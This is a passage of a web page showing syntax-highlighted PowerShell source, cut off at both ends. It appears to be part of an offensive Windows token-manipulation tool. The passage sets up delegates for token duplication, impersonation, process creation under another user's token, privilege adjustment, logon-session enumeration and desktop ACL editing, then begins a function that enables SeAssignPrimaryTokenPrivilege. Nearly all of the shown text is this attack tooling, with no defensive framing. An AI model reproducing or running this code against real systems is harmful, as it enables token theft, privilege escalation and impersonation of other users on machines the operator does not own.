= <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$RevertToSelfAddr</span><span class="token punctuation">,</span> <span class="token variable">$RevertToSelfDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$LsaGetLogonSessionDataAddr</span> = Get<span class="token operator">-</span>ProcAddress secur32<span class="token punctuation">.</span>dll LsaGetLogonSessionData    <span class="token variable">$LsaGetLogonSessionDataDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[UInt32]</span><span class="token punctuation">)</span>    <span class="token variable">$LsaGetLogonSessionData</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$LsaGetLogonSessionDataAddr</span><span class="token punctuation">,</span> <span class="token variable">$LsaGetLogonSessionDataDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$CreateProcessWithTokenWAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll CreateProcessWithTokenW    <span class="token variable">$CreateProcessWithTokenWDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>    <span class="token variable">$CreateProcessWithTokenW</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$CreateProcessWithTokenWAddr</span><span class="token punctuation">,</span> <span class="token variable">$CreateProcessWithTokenWDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$memsetAddr</span> = Get<span class="token operator">-</span>ProcAddress msvcrt<span class="token punctuation">.</span>dll memset    <span class="token variable">$memsetDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[Int32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span>    <span class="token variable">$memset</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$memsetAddr</span><span class="token punctuation">,</span> <span class="token variable">$memsetDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$DuplicateTokenExAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll DuplicateTokenEx    <span class="token variable">$DuplicateTokenExDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>    <span class="token variable">$DuplicateTokenEx</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$DuplicateTokenExAddr</span><span class="token punctuation">,</span> <span class="token variable">$DuplicateTokenExDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$LookupAccountSidWAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll LookupAccountSidW    <span class="token variable">$LookupAccountSidWDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>    <span class="token variable">$LookupAccountSidW</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$LookupAccountSidWAddr</span><span class="token punctuation">,</span> <span class="token variable">$LookupAccountSidWDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$CloseHandleAddr</span> = Get<span class="token operator">-</span>ProcAddress kernel32<span class="token punctuation">.</span>dll CloseHandle    <span class="token variable">$CloseHandleDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>    <span class="token variable">$CloseHandle</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$CloseHandleAddr</span><span class="token punctuation">,</span> <span class="token variable">$CloseHandleDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$LsaFreeReturnBufferAddr</span> = Get<span class="token operator">-</span>ProcAddress secur32<span class="token punctuation">.</span>dll LsaFreeReturnBuffer    <span class="token variable">$LsaFreeReturnBufferDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[UInt32]</span><span class="token punctuation">)</span>    <span class="token variable">$LsaFreeReturnBuffer</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$LsaFreeReturnBufferAddr</span><span class="token punctuation">,</span> <span class="token variable">$LsaFreeReturnBufferDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$OpenThreadAddr</span> = Get<span class="token operator">-</span>ProcAddress kernel32<span class="token punctuation">.</span>dll OpenThread    <span class="token variable">$OpenThreadDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[Bool]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span>    <span class="token variable">$OpenThread</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$OpenThreadAddr</span><span class="token punctuation">,</span> <span class="token variable">$OpenThreadDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$OpenThreadTokenAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll OpenThreadToken    <span class="token variable">$OpenThreadTokenDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[Bool]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>    <span class="token variable">$OpenThreadToken</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$OpenThreadTokenAddr</span><span class="token punctuation">,</span> <span class="token variable">$OpenThreadTokenDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$CreateProcessAsUserWAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll CreateProcessAsUserW    <span class="token variable">$CreateProcessAsUserWDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[Bool]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>    <span class="token variable">$CreateProcessAsUserW</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$CreateProcessAsUserWAddr</span><span class="token punctuation">,</span> <span class="token variable">$CreateProcessAsUserWDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$OpenWindowStationWAddr</span> = Get<span class="token operator">-</span>ProcAddress user32<span class="token punctuation">.</span>dll OpenWindowStationW    <span class="token variable">$OpenWindowStationWDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[Bool]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span>    <span class="token variable">$OpenWindowStationW</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$OpenWindowStationWAddr</span><span class="token punctuation">,</span> <span class="token variable">$OpenWindowStationWDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$OpenDesktopAAddr</span> = Get<span class="token operator">-</span>ProcAddress user32<span class="token punctuation">.</span>dll OpenDesktopA    <span class="token variable">$OpenDesktopADelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[String]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[Bool]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span>    <span class="token variable">$OpenDesktopA</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$OpenDesktopAAddr</span><span class="token punctuation">,</span> <span class="token variable">$OpenDesktopADelegate</span><span class="token punctuation">)</span>    <span class="token variable">$ImpersonateSelfAddr</span> = Get<span class="token operator">-</span>ProcAddress Advapi32<span class="token punctuation">.</span>dll ImpersonateSelf    <span class="token variable">$ImpersonateSelfDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[Int32]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>    <span class="token variable">$ImpersonateSelf</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$ImpersonateSelfAddr</span><span class="token punctuation">,</span> <span class="token variable">$ImpersonateSelfDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$LookupPrivilegeValueAddr</span> = Get<span class="token operator">-</span>ProcAddress Advapi32<span class="token punctuation">.</span>dll LookupPrivilegeValueA    <span class="token variable">$LookupPrivilegeValueDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[String]</span><span class="token punctuation">,</span> <span class="token namespace">[String]</span><span class="token punctuation">,</span> <span class="token variable">$LUID</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>    <span class="token variable">$LookupPrivilegeValue</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$LookupPrivilegeValueAddr</span><span class="token punctuation">,</span> <span class="token variable">$LookupPrivilegeValueDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$AdjustTokenPrivilegesAddr</span> = Get<span class="token operator">-</span>ProcAddress Advapi32<span class="token punctuation">.</span>dll AdjustTokenPrivileges    <span class="token variable">$AdjustTokenPrivilegesDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[Bool]</span><span class="token punctuation">,</span> <span class="token variable">$TOKEN_PRIVILEGES</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>    <span class="token variable">$AdjustTokenPrivileges</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$AdjustTokenPrivilegesAddr</span><span class="token punctuation">,</span> <span class="token variable">$AdjustTokenPrivilegesDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$GetCurrentThreadAddr</span> = Get<span class="token operator">-</span>ProcAddress kernel32<span class="token punctuation">.</span>dll GetCurrentThread    <span class="token variable">$GetCurrentThreadDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span>    <span class="token variable">$GetCurrentThread</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$GetCurrentThreadAddr</span><span class="token punctuation">,</span> <span class="token variable">$GetCurrentThreadDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$GetSecurityInfoAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll GetSecurityInfo    <span class="token variable">$GetSecurityInfoDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[UInt32]</span><span class="token punctuation">)</span>    <span class="token variable">$GetSecurityInfo</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$GetSecurityInfoAddr</span><span class="token punctuation">,</span> <span class="token variable">$GetSecurityInfoDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$SetSecurityInfoAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll SetSecurityInfo    <span class="token variable">$SetSecurityInfoDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[UInt32]</span><span class="token punctuation">)</span>    <span class="token variable">$SetSecurityInfo</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$SetSecurityInfoAddr</span><span class="token punctuation">,</span> <span class="token variable">$SetSecurityInfoDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$GetAceAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll GetAce    <span class="token variable">$GetAceDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span>    <span class="token variable">$GetAce</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$GetAceAddr</span><span class="token punctuation">,</span> <span class="token variable">$GetAceDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$LookupAccountSidWAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll LookupAccountSidW    <span class="token variable">$LookupAccountSidWDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>    <span class="token variable">$LookupAccountSidW</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$LookupAccountSidWAddr</span><span class="token punctuation">,</span> <span class="token variable">$LookupAccountSidWDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$AddAccessAllowedAceAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll AddAccessAllowedAce    <span class="token variable">$AddAccessAllowedAceDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>    <span class="token variable">$AddAccessAllowedAce</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$AddAccessAllowedAceAddr</span><span class="token punctuation">,</span> <span class="token variable">$AddAccessAllowedAceDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$CreateWellKnownSidAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll CreateWellKnownSid    <span class="token variable">$CreateWellKnownSidDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>    <span class="token variable">$CreateWellKnownSid</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$CreateWellKnownSidAddr</span><span class="token punctuation">,</span> <span class="token variable">$CreateWellKnownSidDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$SetEntriesInAclWAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll SetEntriesInAclW    <span class="token variable">$SetEntriesInAclWDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token variable">$EXPLICIT_ACCESS</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[UInt32]</span><span class="token punctuation">)</span>    <span class="token variable">$SetEntriesInAclW</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$SetEntriesInAclWAddr</span><span class="token punctuation">,</span> <span class="token variable">$SetEntriesInAclWDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$LocalFreeAddr</span> = Get<span class="token operator">-</span>ProcAddress kernel32<span class="token punctuation">.</span>dll LocalFree    <span class="token variable">$LocalFreeDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span>    <span class="token variable">$LocalFree</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$LocalFreeAddr</span><span class="token punctuation">,</span> <span class="token variable">$LocalFreeDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$LookupPrivilegeNameWAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll LookupPrivilegeNameW    <span class="token variable">$LookupPrivilegeNameWDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>    <span class="token variable">$LookupPrivilegeNameW</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$LookupPrivilegeNameWAddr</span><span class="token punctuation">,</span> <span class="token variable">$LookupPrivilegeNameWDelegate</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">###############################</span>    <span class="token comment" spellcheck="true">#Used to add 64bit memory addresses</span>    <span class="token keyword">Function</span> Add<span class="token operator">-</span>SignedIntAsUnsigned    <span class="token punctuation">{</span>        <span class="token keyword">Param</span><span class="token punctuation">(</span>        <span class="token namespace">[Parameter(Position = 0, Mandatory = $true)]</span>        <span class="token namespace">[Int64]</span>        <span class="token variable">$Value1</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Position = 1, Mandatory = $true)]</span>        <span class="token namespace">[Int64]</span>        <span class="token variable">$Value2</span>        <span class="token punctuation">)</span>        <span class="token namespace">[Byte[]</span><span class="token punctuation">]</span><span class="token variable">$Value1Bytes</span> = <span class="token namespace">[BitConverter]</span>::GetBytes<span class="token punctuation">(</span><span class="token variable">$Value1</span><span class="token punctuation">)</span>        <span class="token namespace">[Byte[]</span><span class="token punctuation">]</span><span class="token variable">$Value2Bytes</span> = <span class="token namespace">[BitConverter]</span>::GetBytes<span class="token punctuation">(</span><span class="token variable">$Value2</span><span class="token punctuation">)</span>        <span class="token namespace">[Byte[]</span><span class="token punctuation">]</span><span class="token variable">$FinalBytes</span> = <span class="token namespace">[BitConverter]</span>::GetBytes<span class="token punctuation">(</span><span class="token namespace">[UInt64]</span>0<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Value1Bytes</span><span class="token punctuation">.</span>Count <span class="token operator">-eq</span> <span class="token variable">$Value2Bytes</span><span class="token punctuation">.</span>Count<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$CarryOver</span> = 0            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> = 0<span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">-lt</span> <span class="token variable">$Value1Bytes</span><span class="token punctuation">.</span>Count<span class="token punctuation">;</span> <span class="token variable">$i</span>+<span class="token operator">+</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">#Add bytes</span>                <span class="token namespace">[UInt16]</span><span class="token variable">$Sum</span> = <span class="token variable">$Value1Bytes</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token variable">$Value2Bytes</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token variable">$CarryOver</span>                <span class="token variable">$FinalBytes</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> = <span class="token variable">$Sum</span> <span class="token operator">-band</span> 0x00FF                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$Sum</span> <span class="token operator">-band</span> 0xFF00<span class="token punctuation">)</span> <span class="token operator">-eq</span> 0x100<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token variable">$CarryOver</span> = 1                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    <span class="token variable">$CarryOver</span> = 0                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">Throw</span> <span class="token string">"Cannot add bytearrays of different sizes"</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token namespace">[BitConverter]</span>::ToInt64<span class="token punctuation">(</span><span class="token variable">$FinalBytes</span><span class="token punctuation">,</span> 0<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">#Enable SeAssignPrimaryTokenPrivilege, needed to query security information for desktop DACL</span>    <span class="token keyword">function</span> Enable<span class="token operator">-</span>SeAssignPrimaryTokenPrivilege    <span class="token punctuation">{</span>            <span class="token namespace">[IntPtr]</span><span class="token variable">$ThreadHandle</span> = <span class="token variable">$GetCurrentThread</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ThreadHandle</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            